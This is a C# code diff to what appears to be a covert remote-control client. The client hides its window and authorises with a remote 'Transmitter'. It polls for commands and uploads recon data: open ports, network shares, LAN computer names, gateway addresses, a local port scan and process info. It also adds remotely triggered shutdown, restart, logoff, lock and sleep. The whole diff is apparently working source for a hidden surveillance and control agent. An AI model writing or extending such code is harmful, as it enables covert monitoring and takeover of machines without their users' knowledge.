@@ -26,6 +26,7 @@ namespace Library
     public class CommandEventArgs : EventArgs
     {
         public ECommand Command { get; set; }
+
         public CommandEventArgs()
         {
 
@@ -38,6 +39,8 @@ namespace Library
 
     public class Handler
     {
+        public TransmitterStatus TransmitterStatus { get; set; }
+        //public bool IsBusy { get; set; }
         private bool isQuitting = false;
         private FileSystemWatcher watcher;
         public Transmitter Transmitter { get; set; }
@@ -69,6 +72,7 @@ namespace Library
         {
             FileDirInfo = new FileDirHandler();
             watcher = new FileSystemWatcher();
+            Worker = new JobWorker();
         }
         #endregion
 
@@ -378,7 +382,7 @@ namespace Library
             catch { }
         }
 
-
+        bool isAuthorized = false;
         public string AppDir { get; private set; }
         public string DirTransfers { get; private set; }
         public string DirPlugins { get; private set; }
@@ -457,16 +461,33 @@ namespace Library
             HostForm.Opacity = 0;
             HostForm.ShowInTaskbar = false;
         }
+
         private void SetupConnectionTimer()
         {
+            Debug.WriteLine("SetupConnectionTimer...");
+            Debug.WriteLine("Trying to authorize...");
+            isAuthorized = Handler.Instance.Transmitter.Authorize();
+            Debug.WriteLine("Is authorized: " + isAuthorized);
+            Debug.WriteLine("Setting up connection timer... Interval: " + CONNECTION_INTERVAL);
             connectTimer = new Timer();
-            if (!ConnectAndSetup())
+            connectTimer.Interval = CONNECTION_INTERVAL;
+            connectTimer.Tick += (o, e) =>
             {
-                connectTimer.Interval = CONNECTION_INTERVAL;
-                connectTimer.Tick += (o, e) =>
+                if (!isAuthorized)
                 {
-                    connectTimer.Enabled = !ConnectAndSetup();
-                };
+                    Debug.WriteLine("Trying to authorize...");
+                    isAuthorized = Handler.Instance.Transmitter.Authorize();
+                }
+            };
+            if (isAuthorized)
+            {
+                Debug.WriteLine("ConnectAndSetup...");
+                ConnectAndSetup();
+                connectTimer.Enabled = false;
+            }
+            else
+            {
+                connectTimer.Start();
             }
         }
 
@@ -481,51 +502,34 @@ namespace Library
             }
         }
 
-        /// <summary>
-        /// Returns TRUE if authorized
-        /// </summary>
-        /// <returns></returns>
-        bool ConnectAndSetup()
+        void ConnectAndSetup()
         {
-            bool isAuthorized = Handler.Instance.Transmitter.Authorize();
-            if (isAuthorized)
+            OnAuthorizedEvent(this, new AuthEventArgs()
             {
-                //Handler.Instance.StartExceptionHandling();
-                Handler.Instance.StartDirectoryWatcher();
-                Handler.Instance.OnFileEvent += (o, e) =>
+                IsAuthenticated = isAuthorized
+            });
+            //Handler.Instance.StartExceptionHandling();
+            Handler.Instance.StartDirectoryWatcher();
+            Handler.Instance.OnFileEvent += (o, e) =>
+            {
+                HandleFileEvent(e);
+            };
+            transmitTimer = new Timer();
+            transmitTimer.Interval = transmitTimerInterval;
+            transmitTimer.Tick += (o, e) =>
+            {
+                Handler.Instance.Transmitter.LoadSettings();
+                if (Handler.Instance.Transmitter.TSettings == null)
                 {
-                    HandleFileEvent(e);
-                };
-                transmitTimer = new Timer();
-                transmitTimer.Interval = transmitTimerInterval;
-                transmitTimer.Tick += (o, e) =>
+                    return;
+                }
+                Handler.Instance.Transmitter.UpdateLastActive();
+                OnCommandEvent(this, new CommandEventArgs()
                 {
-                    Handler.Instance.Transmitter.LoadSettings();
-                    if (Handler.Instance.Transmitter.TSettings == null)
-                    {
-                        return;
-                    }
-                    Handler.Instance.Transmitter.UpdateLastActive();
-                    if (Handler.Instance.Transmitter.TSettings.HasExectuted)
-                    {
-                        return;
-                    }
-                    Handler.Instance.Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
-                    if (Handler.Instance.Transmitter.TSettings.Command == ECommand.DO_NOTHING)
-                    {
-                        OnAuthorizedEvent(this, new AuthEventArgs()
-                        {
-                            IsAuthenticated = isAuthorized
-                        });
-                    }
-                    OnCommandEvent(this, new CommandEventArgs()
-                    {
-                        Command = Handler.Instance.Transmitter.TSettings.Command
-                    });
-                };
-                transmitTimer.Enabled = true;
-            }
-            return isAuthorized;
+                    Command = Handler.Instance.Transmitter.TSettings.Command
+                });
+            };
+            transmitTimer.Enabled = true;
         }
 
         private void CreateDirectory(string dir)
@@ -608,19 +612,61 @@ namespace Library
             EmptyWorkingSet(Process.GetCurrentProcess().Handle);
         }
 
-        public UploadResult UploadPortInfo()
+        public JobWorker Worker { get; set; }
+
+        public void StartWork(bool isDone = false, string fileName = "", int fileSize = -1)
+        {
+            if (Worker != null)
+            {
+                TransmitterStatus = TransmitterStatus.BUSY;
+                Worker.Start(fileName, fileSize);
+                UploadResult(Worker.Result);
+                if (isDone)
+                {
+                    Worker.IsDone = true;
+                    Worker.Result.Percentage = 100;
+                }
+            }
+        }
+
+        public void StopWork()
+        {
+            if (Worker != null)
+            {
+                TransmitterStatus = TransmitterStatus.IDLE;
+                UploadResult(Worker.Result);
+                Worker.Stop();
+                Transmitter.SetHasExectuted(Handler.Instance.Transmitter.TSettings);
+            }
+        }
+
+        int temp = 0;
+
+        public void UploadPortInfo()
         {
             StringBuilder sb = new StringBuilder();
             var piList = FirewallManager.Instance.GetPortInfo();
             piList.ForEach((Library.PortInfo pi) => sb.AppendLine(pi.IP + ":" + pi.Port + " - " + pi.Name));
             var data = sb.ToString();
-            UploadResult result = new UploadResult()
+            StartWork(false, "ports.txt", data.Length);
+
+            var t = new System.Windows.Forms.Timer();
+            t.Interval = 1000;
+            t.Tick += (o, e) =>
             {
-                FileName = "ports.txt",
-                FileSize = data.Length
+                temp++;
+                if (temp > 3)
+                {
+                    Worker.IsDone = true;
+                }
+                else
+                {
+                    Worker.Result.Percentage += 25;
+                    Handler.Instance.UploadResult(Worker.Result);
+                }
             };
-            Handler.Instance.Transmitter.UploadData(result.FileName, data, false);
-            return result;
+            t.Start();
+            Handler.Instance.Transmitter.UploadData(Worker.Result.FileName, data, false);
         }
 
         public void UploadProcessInfo()
@@ -950,10 +996,144 @@ namespace Library
             }
             catch { }
         }
-        
+
         public void UploadResult(UploadResult result)
         {
             Handler.Instance.Transmitter.UploadData("result.json", Newtonsoft.Json.JsonConvert.SerializeObject(result), false);
+        }
+
+        public UploadResult UploadShares()
+        {
+            StringBuilder sb = new StringBuilder();
+            var piList = FirewallManager.Instance.GetShareInfo();
+            piList.ForEach((Library.ShareInfo si) => sb.AppendLine("Name: " + si.Name + ", Remark: " + si.Remark + ", Type: " + si.Type));
+            var data = sb.ToString();
+            UploadResult result = new UploadResult()
+            {
+                FileName = "shares.txt",
+                FileSize = data.Length
+            };
+            Handler.Instance.Transmitter.UploadData(result.FileName, data, false);
+            return result;
+        }
+
+        public UploadResult UploadLANComputers()
+        {
+            StringBuilder sb = new StringBuilder();
+            var piList = FirewallManager.Instance.GetLANComputers();
+            piList.ForEach((Library.LANComputerInfo lci) => sb.AppendLine("Name: " + lci.Name));
+            var data = sb.ToString();
+            UploadResult result = new UploadResult()
+            {
+                FileName = "lan_computers.txt",
+                FileSize = data.Length
+            };
+            Handler.Instance.Transmitter.UploadData(result.FileName, data, false);
+            return result;
+        }
+
+        public UploadResult UploadGatewayInfo()
+        {
+            StringBuilder sb = new StringBuilder();
+            var piList = FirewallManager.Instance.GetGetwayInfo();
+            piList.ForEach((Library.GatewayInfo i) => sb.AppendLine("Adapter description: " + i.AdapterDescription + ", Address: " + i.Address));
+            var data = sb.ToString();
+            UploadResult result = new UploadResult()
+            {
+                FileName = "gateways.txt",
+                FileSize = data.Length
+            };
+            Handler.Instance.Transmitter.UploadData(result.FileName, data, false);
+            return result;
+        }
+
+
+
+        public UploadResult UploadPortscan()
+        {
+            sbPorts = new StringBuilder();
+            ps = new PortScanner("127.0.0.1", 80, 1024, 10);
+            var timer = new System.Windows.Forms.Timer();
+            timer.Interval = 1000;
+            timer.Tick += timer_Tick;
+            timer.Enabled = true;
+            var portType = PortType.TCP;
+            sbPorts.AppendLine((portType == PortType.TCP ? "TCP" : "UDP") + " Portscan initiated...");
+            sbPorts.AppendLine("Target: " + ps.ScanAddress + ", Timeout: " + ps.PortTimeoutTreshold + ", Range: " + ps.PortStart + " - " + ps.PortEnd);
+            if (ps.RunScan(PortType.TCP))
+            {
+                sbPorts.AppendLine("Portscan finished!");
+                timer.Enabled = false;
+            }
+            //piList.ForEach((Library.GatewayInfo i) => sbPorts.AppendLine("Adapter description: " + i.AdapterDescription + ", Address: " + i.Address));
+            var data = sbPorts.ToString();
+            UploadResult result = new UploadResult()
+            {
+                FileName = "portscan.txt",
+                FileSize = data.Length
+            };
+            Handler.Instance.Transmitter.UploadData(result.FileName, data, false);
+            return result;
+        }
+
+        PortScanner ps;
+        StringBuilder sbPorts;
+
+        void timer_Tick(object sender, EventArgs e)
+        {
+            if (ps != null && ps.IsReady)
+            {
+                while (ps.ScanResults.Count > 0 && ps.PortScanFinished == false)
+                {
+                    var result = ps.ScanResults.Dequeue();
+                    if (result != null)
+                    {
+                        if (result.IsOpen)
+                        {
+                            sbPorts.AppendLine(result.ToString());
+                        }
+                        else
+                        {
+                            if (ps.CanPrintClosedPorts)
+                            {
+                                sbPorts.AppendLine(result.ToString());
+                            }
+                        }
+                    }
+                }
+                //txtStatus.Text = "Port scan " + Math.Round(ps.PercentageDone, 0) + "%. Found: " + ps.FoundPorts.Count;
+            }
+        }
+
+        // http://www.computerhope.com/shutdown.htm
+        public void Shutdown()
+        {
+            SystemPowerUtils.Shutdown();
+        }
+
+        public void Restart()
+        {
+            SystemPowerUtils.Restart();
+        }
+
+        public void Logoff()
+        {
+            SystemPowerUtils.Logoff();
+        }
+
+        public void LockComputer()
+        {
+            SystemPowerUtils.LockComputer();
+        }
+
+        public void Hibernate()
+        {
+            SystemPowerUtils.Hibernate();
+        }
+
+        public void Sleep()
+        {
+            SystemPowerUtils.Sleep();
         }
     }
 }
